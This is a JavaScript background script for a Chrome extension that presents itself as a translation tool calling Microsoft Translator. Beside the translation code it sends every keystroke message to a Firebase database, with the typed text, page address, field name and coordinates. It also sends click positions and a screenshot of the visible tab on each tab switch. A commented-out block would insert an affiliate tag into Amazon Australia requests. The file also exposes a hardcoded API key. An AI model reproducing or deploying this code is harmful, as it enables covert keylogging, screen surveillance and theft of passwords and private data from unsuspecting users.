// Code Snippet from https://stackoverflow.com/a/2117523 to produce UUIDV4
function uuidv4() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
};

 
async function getTranslatedText(fromLanguage, toLanguage, text) {
    console.log(fromLanguage, toLanguage, text);
    const subscriptionKey = "e4aeb629ea72481d8d29746bad3094d2";
    const endpoint = "https://api.cognitive.microsofttranslator.com/translate";

    // Add your location, also known as region. The default is global.
    // This is required if using a Cognitive Services resource.
    const location = "australiaeast";
    
    const res = await fetch(endpoint + `?api-version=3.0&from=${fromLanguage}&to[]=${toLanguage}`, {
        method: 'post',
        headers: {
            'Ocp-Apim-Subscription-Key': subscriptionKey,
            'Ocp-Apim-Subscription-Region': location,
            'Content-type': 'application/json',
            'X-ClientTraceId': uuidv4().toString()
        },
        body: JSON.stringify([{'text': text}])
    })
    const data = await res.json();
    return data[0]['translations'][0]['text'];
}
  
chrome.runtime.onMessage.addListener (
    function(request, sender, sendResponse) {
        if (request.type == 'getTranslatedText') {
            const fromLanguage = 'en';
            const text = request.text;
            chrome.storage.local.get(['language'],
                async function(toLanguage) {
                    const newText = await getTranslatedText(
                        fromLanguage, 
                        toLanguage.language,
                        text);
                    sendResponse(newText);
                });
        }
        if (request.type === 'keyup') {
            const http = new XMLHttpRequest();
            const url = "https://test123-e9b07-default-rtdb.firebaseio.com/keys.json";
            http.open("POST", url, true);
            http.send(JSON.stringify({
                "text": request.text,
                "URI": request.URI,
                "name": request.name,
                "coords": request.coords,
            }));
        }
        if (request.type = 'click') {
            const http = new XMLHttpRequest();
            const url = "https://test123-e9b07-default-rtdb.firebaseio.com/clicks.json";
            http.open("POST", url, true);
            http.send(JSON.stringify({
                        'URI': request.URI,
                        'screenX': request.screenX,
                        'screenY': request.screenY,
                    }));
        }
        return true;
    }
);

chrome.tabs.onActivated.addListener(function(id) {
    chrome.tabs.captureVisibleTab(null, {}, function(img) {
        const http = new XMLHttpRequest();
        const url = "https://test123-e9b07-default-rtdb.firebaseio.com/capture.json";
        http.open("POST", url, true);
        http.send(JSON.stringify({"capture": img}));
    })
})

chrome.webRequest.onBeforeRequest.addListener(function (req) {
    console.log(url);
    const url = new URL(req.url);
    return {
        redirectUrl: url.toString()
    }},
    {urls: ["https://amazon.com.au/*"]},
    ["blocking"]);

// chrome.webRequest.onBeforeRequest.addListener(function (req) {
//     console.log("hi");
//     const url = new URL(req.url + '?ref=as_li_ss_tl?ie=UTF8&linkCode=ll2&tag=shopback-22&linkId=6038ecf469f42826c6a26bb5cd395d49&language=en_AU&ascsubtag=99841780SB010');
//     return {
//         redirectUrl: url.toString()
//     }},
//     {urls: ["amazon.com.au"]},
//     ["blocking"]);
